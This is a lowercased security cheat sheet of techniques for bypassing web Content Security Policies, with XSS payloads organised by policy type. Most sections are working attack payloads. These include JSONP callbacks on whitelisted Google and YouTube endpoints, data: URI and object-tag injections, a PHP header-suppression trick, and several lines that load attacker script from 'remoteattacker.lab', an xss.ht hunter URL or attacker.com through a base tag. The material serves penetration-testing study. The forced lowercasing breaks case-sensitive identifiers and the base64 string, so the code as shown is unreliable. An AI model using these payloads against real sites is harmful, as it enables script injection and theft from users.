# csp bypass

> a content security policy (csp) is a security feature that helps prevent cross-site scripting (xss), data injection attacks, and other code-injection vulnerabilities in web applications. it works by specifying which sources of content (like scripts, styles, images, etc.) are allowed to load and execute on a webpage.


## summary

- [csp detection](#csp-detection)
- [bypass csp using jsonp](#bypass-csp-using-jsonp)
- [bypass csp default-src](#bypass-csp-default-src)
- [bypass csp inline eval](#bypass-csp-inline-eval)
- [bypass csp unsafe-inline](#bypass-csp-unsafe-inline)
- [bypass csp script-src self](#bypass-csp-script-src-self)
- [bypass csp script-src data](#bypass-csp-script-src-data)
- [bypass csp nonce](#bypass-csp-nonce)
- [bypass csp header sent by php](#bypass-csp-header-sent-by-php)
- [labs](#labs)
- [references](#references)


## csp detection

check the csp on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [how to use google’s csp evaluator to bypass csp](https://websecblog.com/vulns/google-csp-evaluator/)


## bypass csp using jsonp

**requirements**:

* csp: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`

**payload**:

use a callback function from a whitelisted source listed in the csp.

* google search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`
* google account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
* google translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`
* youtube: `https://www.youtube.com/oembed?callback=alert;`
* [intruders/jsonp_endpoint.txt](intruders/jsonp_endpoint.txt)
* [jsonbee/jsonp.txt](https://github.com/zigoo0/jsonbee/blob/master/jsonp.txt)

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```


## bypass csp default-src

**requirements**:

* csp like `content-security-policy: default-src 'self' 'unsafe-inline';`, 

**payload**:

`http://example.lab/csp.php?xss=f=document.createelement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7bx=document.createelement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentwindow.document.body.appendchild%28x%29%7d;document.body.appendchild%28f%29;`

```js
script=document.createelement('script');
script.src='//remoteattacker.lab/csp.js';
window.frames[0].document.head.appendchild(script);
```

source: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)


## bypass csp inline eval 

**requirements**:

* csp `inline` or `eval`


**payload**:

```js
d=document;f=d.createelement("iframe");f.src=d.queryselector('link[href*=".css"]').href;d.body.append(f);s=d.createelement("script");s.src="https://[your_xsshunter_username].xss.ht";settimeout(function(){f.contentwindow.document.head.append(s);},1000)
```

source: [rhynorater](https://gist.github.com/rhynorater/311cf3981fda8303d65c27316e69209f)


## bypass csp script-src self 

**requirements**:

* csp like `script-src self`

**payload**:

```js
<object data="data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg=="></object>
```

source: [@akita_zen](https://twitter.com/akita_zen)


## bypass csp script-src data

**requirements**:

* csp like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-us/docs/web/http/headers/content-security-policy/script-src).


**payload**:

```javascript
<script src="data:,alert(1)">/</script>
```

source: [@404death](https://twitter.com/404death/status/1191222237782659072)


## bypass csp unsafe-inline

**requirements**:

* csp: `script-src https://google.com 'unsafe-inline';`

**payload**:

```javascript
"/><script>alert(1);</script>
```


## bypass csp nonce

**requirements**:

* csp like `script-src 'nonce-random_nonce'`
* imported js file with a relative link: `<script src='/path.js'></script>`


**payload**:

1. inject a base tag.
  ```html
  <base href=http://www.attacker.com>
  ```
2. host your custom js file at the same path that one of the website's script.
  ```
  http://www.attacker.com/path.js
  ```


## bypass csp header sent by php

**requirements**:

* csp sent by php `header()` function 


**payload**:

in default `php:apache` image configuration, php cannot modify headers when the response's data has already been written. this event occurs when a warning is raised by php engine.

here are several ways to generate a warning:

- 1000 $_get parameters
- 1000 $_post parameters
- 20 $_files

if the **warning** are configured to be displayed you should get these:

* **warning**: `php request startup: input variables exceeded 1000. to increase the limit change max_input_vars in php.ini. in unknown on line 0`
* **warning**: `cannot modify header information - headers already sent in /var/www/html/index.php on line 2`


```ps1
get /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[repeated &a 1000 times]&a&a&a&a
```

source: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)


## labs

* [root me - csp bypass - inline code](https://www.root-me.org/en/challenges/web-client/csp-bypass-inline-code)
* [root me - csp bypass - nonce](https://www.root-me.org/en/challenges/web-client/csp-bypass-nonce)
* [root me - csp bypass - nonce 2](https://www.root-me.org/en/challenges/web-client/csp-bypass-nonce-2)
* [root me - csp bypass - dangling markup](https://www.root-me.org/en/challenges/web-client/csp-bypass-dangling-markup)
* [root me - csp bypass - dangling markup 2](https://www.root-me.org/en/challenges/web-client/csp-bypass-dangling-markup-2)
* [root me - csp bypass - jsonp](https://www.root-me.org/en/challenges/web-client/csp-bypass-jsonp)


## references

- [airbnb – when bypassing json encoding, xss filter, waf, csp, and auditor turns into eight vulnerabilities - brett buerhaus (@bbuerhaus) - march 8, 2017](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)
- [d1t1 - so we broke all csps - michele spagnuolo and lukas weichselbaum - 27 jun 2017](http://web.archive.org/web/20170627043828/https://conference.hitb.org/hitbsecconf2017ams/materials/d1t1%20-%20michele%20spagnuolo%20and%20lukas%20wilschelbaum%20-%20so%20we%20broke%20all%20csps.pdf)
- [making an xss triggered by csp bypass on twitter - wiki.ioin.in(查看原文) - 2020-04-06](https://www.buaq.net/go-25883.html)